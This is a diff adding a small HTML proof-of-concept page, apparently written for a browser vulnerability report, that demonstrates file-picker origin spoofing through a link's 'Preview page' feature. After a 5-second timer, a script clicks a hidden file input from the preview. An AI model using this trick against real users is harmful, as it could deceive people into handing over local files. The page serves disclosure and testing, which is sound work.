@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - SelectFileDialog Spoofing via EphemeralTab</title>
+</head>
+<body>
+    <h2>PoC: File Picker Origin Spoofing</h2>
+    <p>1. Klik kanan (atau tekan lama) tautan di bawah ini.</p>
+    <p>2. Pilih menu <b>"Preview page" (Pratinjau halaman)</b>.</p>
+    <p>3. Tunggu 5 detik saat pratinjau halaman terbuka.</p>
+
+    <br>
+    <!-- Tautan untuk memicu EphemeralTab -->
+    <a href="https://example.com">Tekan lama tautan ini untuk Preview Page</a>
+
+    <!-- Input file tersembunyi -->
+    <input type="file" id="fileInput" style="display: none;">
+
+    <script>
+        // Simulasi race condition / timing attack dari tab latar belakang
+        setTimeout(() => {
+            console.log("Triggering file picker from background page...");
+            const fileInput = document.getElementById('fileInput');
+            
+            // Mengaktifkan dialog file picker secara otomatis
+            fileInput.click();
+        }, 5000);
+    </script>
+</body>
+</html>
